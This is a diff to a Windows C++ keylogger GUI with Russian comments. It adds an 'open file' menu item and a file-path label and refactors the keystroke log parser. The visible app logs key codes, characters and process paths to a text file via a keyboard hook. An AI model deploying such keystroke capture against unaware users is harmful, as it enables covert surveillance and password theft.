@@ -133,37 +133,34 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
             LoadKeyloggerRecordsFromFile(hWnd);
             KeyloggerFilling(hwndListView);
             break;
+        case OnOpenFile:
+            OpenTextFile();
+            break;
         case OnClearedList:
             keyloggerRecords.clear();
             ListView_DeleteAllItems(hwndListView);
             break;
         case OnRecordAction:
 
-            // Проверяем, был ли выбран путь для записи
-            //if (globalFilePath[0] == 0) {  // Если путь не выбран (пустой)
-                //MessageBoxW(hWnd, L"Пожалуйста, выберите папку для записи файла.", L"Ошибка", MB_OK | MB_ICONERROR);
-            //}
-            //else {
-                // Меняем текст кнопки в зависимости от состояния
-                if (isRecordStarted) {
-                    SetWindowText(hwndRecordButton, L"Начать запись");
+            // Меняем текст кнопки в зависимости от состояния
+            if (isRecordStarted) {
+                SetWindowText(hwndRecordButton, L"Начать запись");
 
-                    // Удаляем хук, если запись остановлена
-                    RemoveKeyboardHook();
+                // Удаляем хук, если запись остановлена
+                RemoveKeyboardHook();
 
-                    //LoadKeyloggerRecordsFromFile(hWnd);
-                    //KeyloggerFilling(hwndListView);
-                }
-                else {
-                    SetWindowText(hwndRecordButton, L"Остановить запись");
+                //LoadKeyloggerRecordsFromFile(hWnd);
+                //KeyloggerFilling(hwndListView);
+            }
+            else {
+                SetWindowText(hwndRecordButton, L"Остановить запись");
 
-                    // Устанавливаем хук, если запись начата
-                    SetKeyboardHook();
-                }
+                // Устанавливаем хук, если запись начата
+                SetKeyboardHook();
+            }
 
-                // Переключаем состояние
-                isRecordStarted = !isRecordStarted;
-            //}
+            // Переключаем состояние
+            isRecordStarted = !isRecordStarted;
 
             break;
         default:
@@ -257,6 +254,7 @@ void MainWndAddMenues(HWND hwnd) {
     HMENU RootMenu = CreateMenu();
     AppendMenu(RootMenu, MF_STRING, OnCreateFile, L"Создать файл");
     AppendMenu(RootMenu, MF_STRING, OnReadFile, L"Выбрать файл");
+    AppendMenu(RootMenu, MF_STRING, OnOpenFile, L"Открыть файл");
     AppendMenu(RootMenu, MF_STRING, OnClearedList, L"Очистить список");
     AppendMenu(RootMenu, MF_STRING, IDM_EXIT, L"Выход");
     SetMenu(hwnd, RootMenu);
@@ -264,9 +262,41 @@ void MainWndAddMenues(HWND hwnd) {
 
 // Добавление виджетов в рабочую область приложения
 void MainWndAddWidgets(HWND hwnd) {
-
-
     hwndRecordButton = CreateWindowA("button", "Начать запись", WS_VISIBLE | WS_CHILD | ES_CENTER, 25, 10, 150, 40, hwnd, (HMENU)OnRecordAction, NULL, NULL);
+
+    // Метка для отображения пути к файлу
+    hwndFilePathLabel = CreateWindowA("static", "Файл: Не выбран", WS_VISIBLE | WS_CHILD | SS_LEFT, 225, 20, 500, 20, hwnd, NULL, NULL, NULL);
+}
+
+// Обработчик события OnOpenFile
+void OpenTextFile() {
+
+    // Проверяем, что файл был выбран
+    if (filename[0] != '\0') {
+
+        // Открываем файл с помощью связанной программы
+        if ((int)ShellExecuteA(NULL, "open", filename, NULL, NULL, SW_SHOW) <= 32) {
+
+            // Если открыть файл не удалось, показываем сообщение об ошибке
+            MessageBoxA(NULL, "Не удалось открыть файл.", "Ошибка", MB_OK | MB_ICONERROR);
+        }
+    }
+    else {
+        // Если файл не выбран, показываем сообщение
+        MessageBoxA(NULL, "Файл не выбран.", "Ошибка", MB_OK | MB_ICONWARNING);
+    }
+}
+
+// Функция для обновления виджета с путем к файлу
+void UpdateFilePathLabel() {
+    if (hwndFilePathLabel) {
+        // Формируем текст для отображения
+        char labelText[512];
+        snprintf(labelText, sizeof(labelText), "Файл: %s", filename[0] ? filename : "Не выбран");
+
+        // Обновляем текст в виджете
+        SetWindowTextA(hwndFilePathLabel, labelText);
+    }
 }
 
 // Инициализация структуры OPENFILENAME
@@ -286,41 +316,36 @@ void SetOpenFileParams(HWND hwnd) {
     ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
 }
 
-
-
 // Функция парсинга содержимого файла в записи keylogger
-vector<KeyloggerRecord> ParseKeyloggerData(const string& fileContent) {
-    vector<KeyloggerRecord> keyloggerData;
-    stringstream stream(fileContent);
-    string line;
-
-    // Очищаем текущий массив перед добавлением новых записей
-    keyloggerRecords.clear();
+std::vector<KeyloggerRecord> ParseKeyloggerData(const std::string& fileContent) {
+    std::vector<KeyloggerRecord> keyloggerData;
+    std::stringstream stream(fileContent);
+    std::string line;
 
     // Чтение каждой строки из файла
-    while (getline(stream, line)) {
+    while (std::getline(stream, line)) {
         if (line.empty()) continue;
 
-        stringstream ss(line);  // Создаем поток для текущей строки
-        string part;
+        std::stringstream ss(line); // Создаем поток для текущей строки
+        std::string part;
 
         KeyloggerRecord record;
 
         // Чтение и разбор строки по разделителю ";"
-        if (getline(ss, part, ';')) {
-            record.processId = stoi(part); // ID процесса
+        if (std::getline(ss, part, ';')) {
+            record.processId = std::stoul(part); // ID процесса
         }
-        if (getline(ss, part, ';')) {
-            record.processPath = wstring(part.begin(), part.end()); // Путь к процессу
+        if (std::getline(ss, part, ';')) {
+            record.processPath = std::wstring(part.begin(), part.end()); // Путь к процессу
         }
-        if (getline(ss, part, ';')) {
-            record.dateTime = wstring(part.begin(), part.end()); // Дата и время
+        if (std::getline(ss, part, ';')) {
+            record.dateTime = std::wstring(part.begin(), part.end()); // Дата и время
         }
-        if (getline(ss, part, ';')) {
-            record.keyCode = stoi(part); // Код клавиши
+        if (std::getline(ss, part, ';')) {
+            record.keyCode = std::stoi(part); // Код клавиши
         }
-        if (getline(ss, part, ';')) {
-            record.keyChar = part[0]; // Символ клавиши
+        if (std::getline(ss, part, ';')) {
+            record.keyChar = std::wstring(part.begin(), part.end()); // Символ клавиши
         }
 
         // Добавляем разобранную запись в массив
@@ -336,6 +361,7 @@ void LoadKeyloggerRecordsFromFile(HWND hwndListView) {
 
     // Открываем диалог выбора файла
     if (GetOpenFileNameA(&ofn)) {
+
         // Открываем файл для чтения
         ifstream file(filename);
         if (!file.is_open()) {
@@ -347,6 +373,8 @@ void LoadKeyloggerRecordsFromFile(HWND hwndListView) {
         stringstream fileContent;
         fileContent << file.rdbuf();
         file.close();
+
+        UpdateFilePathLabel();
 
         // Парсим содержимое файла
         keyloggerRecords = ParseKeyloggerData(fileContent.str());
@@ -380,11 +408,11 @@ void CreateFileInSelectedFolder(HWND hwnd) {
         strftime(fileName, sizeof(fileName), "%d%m%Y-%H%M%S.txt", &tstruct);
 
         // Формируем полный путь к файлу
-        snprintf(globalFilePath, MAX_PATH, "%s\\%s", folderPath, fileName);  // Сохраняем путь в глобальную переменную
+        snprintf(filename, MAX_PATH, "%s\\%s", folderPath, fileName);  // Сохраняем путь в глобальную переменную
 
         // Создаем файл в выбранной папке
         HANDLE hFile = CreateFileA(
-            globalFilePath,  // Используем глобальную переменную для пути
+            filename,  // Используем глобальную переменную для пути
             GENERIC_WRITE,
             0,
             NULL,
@@ -400,6 +428,8 @@ void CreateFileInSelectedFolder(HWND hwnd) {
         else {
             MessageBoxA(hwnd, "Не удалось создать файл.", "Ошибка", MB_OK | MB_ICONERROR);
         }
+
+        UpdateFilePathLabel();
     }
     else {
         MessageBoxA(hwnd, "Выбор папки отменен.", "Отмена", MB_OK | MB_ICONINFORMATION);
@@ -497,7 +527,7 @@ void WriteToFileANSI(const KeyloggerRecord& record) {
     WideCharToMultiByte(CP_ACP, 0, record.keyChar.c_str(), -1, keyCharAnsi, bufferSize, NULL, NULL);
 
     // Открываем файл для записи в кодировке ANSI
-    std::ofstream outFile(globalFilePath, std::ios::app);
+    std::ofstream outFile(filename, std::ios::app);
     if (outFile.is_open()) {
         outFile << record.processId << ";"
             << processPathAnsi << ";"
@@ -583,7 +613,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 
             // Запись в файл только если путь был выбран
-            if (globalFilePath[0] != 0) {  // Если путь не пуст
+            if (filename[0] != 0) {  // Если путь не пуст
                 WriteToFileANSI(record);
             }
 
@@ -597,8 +627,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
-
-
 
 
 // Установка хука
